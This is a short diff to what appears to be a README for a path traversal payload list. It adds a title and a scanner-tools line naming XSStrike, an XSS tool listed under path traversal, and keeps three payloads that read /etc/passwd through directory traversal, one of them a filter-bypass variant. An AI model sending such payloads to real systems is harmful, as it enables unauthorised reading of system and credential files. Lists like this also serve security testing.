@@ -1,7 +1,11 @@
-# pathfind3rrr
+Path Traversal Attack Payload List
 
 
-# Payload:
+Path Traversal Attack Scanner Tools:
+. XSStrike
+
+
+# Payload List
 ../../../etc/passwd
 /etc/passwd
 ....//....//....//etc/passwd
